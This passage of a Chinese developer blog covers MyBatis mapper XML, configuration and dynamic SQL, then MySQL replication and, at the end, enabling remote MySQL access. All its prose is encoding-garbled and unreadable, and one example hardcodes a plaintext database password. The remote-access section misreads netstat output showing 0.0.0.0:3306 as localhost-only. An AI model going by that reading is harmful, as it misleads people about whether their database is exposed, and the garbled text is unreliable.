<h3 id="3-Mapper-xml"><a href="#3-Mapper-xml" class="headerlink" title="3.*Mapper.xml"></a>3.*Mapper.xml</h3><ul>
<li>å‘½åç©ºé—´å¿…é¡»æŒ‡å‘æ–¹æ³•çš„æ¥å£</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mapper</span></span><br><span class="line"><span class="meta">  PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"</span></span><br><span class="line"><span class="meta">  "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.mybatis.example.BlogMapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectBlog"</span> <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">    select * from Blog where id = #&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>äºæ­¤åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ³¨è§£å¯¹ä¸€äº›ç®€å•çš„sqlè¯­å¥æ˜ å°„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mybatis.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Select</span>(<span class="string">"SELECT * FROM blog WHERE id = #&#123;id&#125;"</span>)</span><br><span class="line">  <span class="function">Blog <span class="title">selectBlog</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="XMLé…ç½®"><a href="#XMLé…ç½®" class="headerlink" title="XMLé…ç½®"></a>XMLé…ç½®</h2><h3 id="1-properties"><a href="#1-properties" class="headerlink" title="1. properties"></a>1. properties</h3><ul>
<li>åŠ è½½å¤–éƒ¨é…ç½®æ–‡ä»¶</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">"org/mybatis/example/config.properties"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"dev_user"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"F2Fa3!33TYyg"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-typeAliases"><a href="#3-typeAliases" class="headerlink" title="3.typeAliases"></a>3.typeAliases</h3><ul>
<li><p>è®¾ç½®åˆ«å å¯ä»¥ä¸ºæ¯ä¸ªpojoè®¾ç½®ï¼›ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šåŒ…åï¼Œmybatisä¼šæ‰«æpackageä¸‹é¢æ‰€æœ‰çš„javabeanï¼›ä¹Ÿå¯ä»¥é€šè¿‡æ³¨è§£</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"domain.blog"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="4-environments"><a href="#4-environments" class="headerlink" title="4.environments"></a>4.environments</h3><ul>
<li><p>å°½ç®¡å¯ä»¥é…ç½®å¤šä¸ªæ•°æ®åº“ç¯å¢ƒï¼Œä½†æ¯ä¸ªSqlsessionFactoryåªèƒ½é€‰æ‹©ä¸€ç§ç¯å¢ƒ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"..."</span> <span class="attr">value</span>=<span class="string">"..."</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-mappers"><a href="#5-mappers" class="headerlink" title="5.mappers"></a>5.mappers</h3><ul>
<li><p>å‘Šè¯‰mybatisåˆ°å“ªé‡Œå¯»æ‰¾é…ç½®æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡ç›´æ¥æŒ‡å®šxmlæ–‡ä»¶ï¼›ä¹Ÿå¯ä»¥é€šè¿‡åŠ è½½åŒåclassï¼›è¿˜å¯ä»¥é€šè¿‡æ‰«æmapperæ‰€åœ¨çš„packageã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å°†åŒ…å†…çš„æ˜ å°„å™¨æ¥å£å®ç°å…¨éƒ¨æ³¨å†Œä¸ºæ˜ å°„å™¨ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"org.mybatis.builder"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="XMLæ˜ å°„æ–‡ä»¶"><a href="#XMLæ˜ å°„æ–‡ä»¶" class="headerlink" title="XMLæ˜ å°„æ–‡ä»¶"></a>XMLæ˜ å°„æ–‡ä»¶</h2><ul>
<li><p><code>cache</code> â€“ è¯¥å‘½åç©ºé—´çš„ç¼“å­˜é…ç½®ã€‚</p>
</li>
<li><p><code>cache-ref</code> â€“ å¼•ç”¨å…¶å®ƒå‘½åç©ºé—´çš„ç¼“å­˜é…ç½®ã€‚</p>
</li>
<li><p><code>resultMap</code> â€“ æè¿°å¦‚ä½•ä»æ•°æ®åº“ç»“æœé›†ä¸­åŠ è½½å¯¹è±¡ï¼Œæ˜¯æœ€å¤æ‚ä¹Ÿæ˜¯æœ€å¼ºå¤§çš„å…ƒç´ ã€‚</p>
<p>è§£å†³pojoä¸­å±æ€§åä¸æ•°æ®åº“ä¸­åˆ—åä¸æƒ³ç­‰çš„æƒ…å†µ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"userResultMap"</span> <span class="attr">type</span>=<span class="string">"User"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"user_id"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"username"</span> <span class="attr">column</span>=<span class="string">"user_name"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"password"</span> <span class="attr">column</span>=<span class="string">"hashed_password"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUsers"</span> <span class="attr">resultMap</span>=<span class="string">"userResultMap"</span>&gt;</span></span><br><span class="line">  select user_id, user_name, hashed_password</span><br><span class="line">  from some_table</span><br><span class="line">  where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¤šå¯¹ä¸€çš„æ˜ å°„</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"author"</span> <span class="attr">javaType</span>=<span class="string">"Author"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"author_id"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"username"</span> <span class="attr">column</span>=<span class="string">"author_username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"password"</span> <span class="attr">column</span>=<span class="string">"author_password"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"email"</span> <span class="attr">column</span>=<span class="string">"author_email"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"bio"</span> <span class="attr">column</span>=<span class="string">"author_bio"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"favouriteSection"</span> <span class="attr">column</span>=<span class="string">"author_favourite_section"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸€å¯¹å¤šçš„æ˜ å°„</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"tags"</span> <span class="attr">ofType</span>=<span class="string">"Tag"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"tag_id"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p><code>sql</code> â€“ å¯è¢«å…¶å®ƒè¯­å¥å¼•ç”¨çš„å¯é‡ç”¨è¯­å¥å—ã€‚</p>
</li>
<li><p><code>insert</code> â€“ æ˜ å°„æ’å…¥è¯­å¥ã€‚</p>
</li>
<li><p><code>update</code> â€“ æ˜ å°„æ›´æ–°è¯­å¥ã€‚</p>
</li>
<li><p><code>delete</code> â€“ æ˜ å°„åˆ é™¤è¯­å¥ã€‚</p>
</li>
<li><p><code>select</code> â€“ æ˜ å°„æŸ¥è¯¢è¯­å¥</p>
</li>
</ul>
<h2 id="åŠ¨æ€sql"><a href="#åŠ¨æ€sql" class="headerlink" title="åŠ¨æ€sql"></a>åŠ¨æ€sql</h2><ul>
<li>æœ¬è´¨ä¸Šæ˜¯sqlçš„æ‹¼æ¥</li>
<li>å¯ä»¥é€šè¿‡sqlã€whenã€ifã€foreachç­‰æ ‡ç­¾è¿›è¡Œæ§åˆ¶</li>
</ul>
<h4 id="ifï¼šæ»¡è¶³æ¡ä»¶å°±æ‹¼æ¥"><a href="#ifï¼šæ»¡è¶³æ¡ä»¶å°±æ‹¼æ¥" class="headerlink" title="ifï¼šæ»¡è¶³æ¡ä»¶å°±æ‹¼æ¥"></a><strong>if</strong>ï¼šæ»¡è¶³æ¡ä»¶å°±æ‹¼æ¥</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogWithTitleLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG</span><br><span class="line">  WHERE state = â€˜ACTIVEâ€™</span><br><span class="line">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">    AND title like #&#123;title&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="chooseã€whenã€otherwiseï¼šåªæ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶"><a href="#chooseã€whenã€otherwiseï¼šåªæ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶" class="headerlink" title="chooseã€whenã€otherwiseï¼šåªæ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶"></a><strong>choose</strong>ã€<strong>when</strong>ã€<strong>otherwise</strong>ï¼šåªæ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG WHERE state = â€˜ACTIVEâ€™</span><br><span class="line">  <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">      AND title like #&#123;title&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"author != null and author.name != null"</span>&gt;</span></span><br><span class="line">      AND author_name like #&#123;author.name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">otherwise</span>&gt;</span></span><br><span class="line">      AND featured = 1</span><br><span class="line">    <span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="whereï¼šå»å¤„ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æŸ¥è¯¢ä¸­çš„andå…³é”®å­—"><a href="#whereï¼šå»å¤„ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æŸ¥è¯¢ä¸­çš„andå…³é”®å­—" class="headerlink" title="whereï¼šå»å¤„ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æŸ¥è¯¢ä¸­çš„andå…³é”®å­—"></a><strong>where</strong>ï¼šå»å¤„ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æŸ¥è¯¢ä¸­çš„<strong>and</strong>å…³é”®å­—</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG</span><br><span class="line">  <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"state != null"</span>&gt;</span></span><br><span class="line">         state = #&#123;state&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">        AND title like #&#123;title&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"author != null and author.name != null"</span>&gt;</span></span><br><span class="line">        AND author_name like #&#123;author.name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="foreachï¼šå¯¹é›†åˆè¿›è¡Œéå†ï¼Œå°¤å…¶æ˜¯åœ¨INå…³é”®å­—ä¸­"><a href="#foreachï¼šå¯¹é›†åˆè¿›è¡Œéå†ï¼Œå°¤å…¶æ˜¯åœ¨INå…³é”®å­—ä¸­" class="headerlink" title="foreachï¼šå¯¹é›†åˆè¿›è¡Œéå†ï¼Œå°¤å…¶æ˜¯åœ¨INå…³é”®å­—ä¸­"></a><strong>foreach</strong>ï¼šå¯¹é›†åˆè¿›è¡Œéå†ï¼Œå°¤å…¶æ˜¯åœ¨<strong>IN</strong>å…³é”®å­—ä¸­</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectPostIn"</span> <span class="attr">resultType</span>=<span class="string">"domain.blog.Post"</span>&gt;</span></span><br><span class="line">  SELECT *</span><br><span class="line">  FROM POST P</span><br><span class="line">  WHERE ID in</span><br><span class="line">  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">"item"</span> <span class="attr">index</span>=<span class="string">"index"</span> <span class="attr">collection</span>=<span class="string">"list"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span> <span class="attr">close</span>=<span class="string">")"</span>&gt;</span></span><br><span class="line">        #&#123;item&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="ç¼“å­˜æŠ€æœ¯"><a href="#ç¼“å­˜æŠ€æœ¯" class="headerlink" title="ç¼“å­˜æŠ€æœ¯"></a>ç¼“å­˜æŠ€æœ¯</h2><h4 id="mysqlä¸»ä»å¤åˆ¶åŸç†"><a href="#mysqlä¸»ä»å¤åˆ¶åŸç†" class="headerlink" title="mysqlä¸»ä»å¤åˆ¶åŸç†"></a>mysqlä¸»ä»å¤åˆ¶åŸç†</h4><ul>
<li>åœ¨æ¯ä¸ªäº‹ç‰©æ›´æ–°æ•°æ®å‰ï¼ŒMasteræœåŠ¡å™¨åœ¨äºŒè¿›åˆ¶æ—¥å¿—ä¸­è®°å½•è¿™äº›æ”¹å˜ï¼Œè®°å½•å®ŒæˆåMasteræœåŠ¡å™¨é€šçŸ¥å­˜å‚¨å¼•æ“æäº¤äº‹åŠ¡ï¼›</li>
<li>SlaveæœåŠ¡å™¨å°†MasteræœåŠ¡å™¨çš„æ—¥å¿—å¤åˆ¶åˆ°å…¶ä¸­ç»§æ—¥å¿—ï¼ˆRelay logï¼‰ã€‚é¦–å…ˆSlaveå¼€å§‹ä¸€ä¸ªå·¥ä½œçº¿ç¨‹I/Oï¼ŒI/Oçº¿ç¨‹åœ¨Masterä¸Šæ‰“å¼€ä¸€ä¸ªè¿æ¥ï¼Œå¼€å§‹Binary log dump processï¼ŒBinary log dump processä»MasteräºŒè¿›åˆ¶æ—¥å¿—ä¸­è¯»å–æ—¶é—´ï¼Œå¦‚æœå·²ç»è·Ÿä¸ŠMasterï¼Œå®ƒä¼šç¡çœ ç­‰å¾…Masteräº§ç”Ÿçš„æ–°äº‹ä»¶ã€‚I/Oçº¿ç¨‹å°†è¿™äº›æ—¶é—´å†™å…¥</li>
<li>SQL slave threadï¼ˆSQLä»çº¿ç¨‹ï¼‰ä»ä¸­ç»§æ—¥å¿—ä¸­è¯»å–äº‹ä»¶ï¼Œå¹¶é‡æ”¾å…¶ä¸­çš„äº‹ä»¶ä»è€Œæ›´æ–°Slaveä¸Šçš„æ•°æ®ï¼Œä½¿å…¶ä¸Masterä¸€è‡´ï¼Œåªè¦è¯¥çº¿ç¨‹ä¸I/Oçº¿ç¨‹ä¿æŒä¸€è‡´ï¼Œä¸­ç»§æ—¥å¿—é€šå¸¸ä¼šä½äºç³»ç»Ÿçš„ç¼“å­˜ä¸­ï¼Œæ‰€ä»¥ä¸­ç»§æ—¥å¿—å¼€é”€å¾ˆå°ã€‚<img src="/home/huzai/å›¾ç‰‡/2020-09-21 20-52-02 çš„å±å¹•æˆªå›¾.png" alt="2020-09-21 20-52-02 çš„å±å¹•æˆªå›¾"></li>
</ul>
<h4 id="mysqlè¯»å†™åˆ†ç¦»åŸç†"><a href="#mysqlè¯»å†™åˆ†ç¦»åŸç†" class="headerlink" title="mysqlè¯»å†™åˆ†ç¦»åŸç†"></a>mysqlè¯»å†™åˆ†ç¦»åŸç†</h4><ul>
<li><p>è¯»å†™åˆ†ç¦»å°±æ˜¯åœ¨ä¸»æœåŠ¡å™¨ä¸Šå†™ï¼Œåªåœ¨ä»æœåŠ¡å™¨ä¸Šè¯»ã€‚åŸºæœ¬åŸç†æ˜¯è®©ä¸»æ•°æ®åº“å¤„ç†äº‹åŠ¡æ€§æŸ¥è¯¢ï¼Œè€Œä»æ•°æ®åº“å¤„ç†selectæŸ¥è¯¢ã€‚æ•°æ®åº“å¤åˆ¶è¢«ç”¨æ¥æŠŠäº‹åŠ¡æ€§æŸ¥è¯¢å¯¼è‡´çš„å˜æ›´åŒæ­¥åˆ°ç¾¤é›†ä¸­çš„æ•°æ®åº“ã€‚</p>
<p>åŸºäºä¸­é—´ä»£ç†å±‚å®ç°ï¼šä»£ç†ä¸€èˆ¬ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´ï¼Œä»£ç†æœåŠ¡å™¨æ¥åˆ°å®¢æˆ·ç«¯è¯·æ±‚é€šè¿‡åˆ¤æ–­è½¬å‘åˆ°åç«¯æ•°æ®åº“ï¼Œè¿™éƒ¨åˆ†é€šè¿‡Amoebaå®ç°ã€‚</p>
<p><img src="/home/huzai/å›¾ç‰‡/2020-09-21 20-54-32 çš„å±å¹•æˆªå›¾.png" alt="2020-09-21 20-54-32 çš„å±å¹•æˆªå›¾"></p>
</li>
</ul>

      
    </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/16/mysqlè¿œç¨‹è¿æ¥/">
      mysqlè¿œç¨‹è¿æ¥
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-16</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h2 id="3306-ç«¯å£"><a href="#3306-ç«¯å£" class="headerlink" title="3306 ç«¯å£"></a>3306 ç«¯å£</h2><ul>
<li>æ­¤å‰ç¡®ä¿3306ç«¯å£æ˜¯æ‰“å¼€çš„(<strong>æœåŠ¡å™¨é˜²ç«å¢™</strong>)</li>
<li><p>åœ¨æœåŠ¡å™¨ä¸­æŸ¥çœ‹ç«¯å£çŠ¶æ€  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an|grep 3306</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚æœä»…ä»…å‡ºç°ğŸ‘‡ä¸‹é¢çš„ä¿¡æ¯,åˆ™è¯´æ˜3306ç«¯å£ä»…ä»…å¯¹localhostå¼€æ”¾,å¤–ç½‘æ˜¯æ— æ³•è®¿é—®çš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½ éœ€è¦æ‰¾åˆ°<strong>mysql.cnf</strong> mysql çš„é…ç½®æ–‡ä»¶,æœ‰å¯èƒ½ä¸æ­¢ä¸€ä¸ª,ä¸”ä¸ä¸€å®šå’Œæˆ‘çš„æ–‡ä»¶åä¸€æ ·,</p>
</li>
<li><p>æ‰¾åˆ°.cnfé…ç½®æ–‡ä»¶ä¸­çš„,å°†å…¶æ³¨é‡Š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#bind-address = 127.0.0.1</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚æœåƒæˆ‘è¿™æ ·,å°±è¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„,ä¸”å·²ç»æœ‰ä¸»æœºè¿æ¥<br><img src="/2020/10/16/mysqlè¿œç¨‹è¿æ¥/1.jpg" alt="1.jpg"></p>
</li>
</ul>
<h2 id="mysqlç”¨æˆ·æƒé™"><a href="#mysqlç”¨æˆ·æƒé™" class="headerlink" title="mysqlç”¨æˆ·æƒé™"></a>mysqlç”¨æˆ·æƒé™</h2><ul>
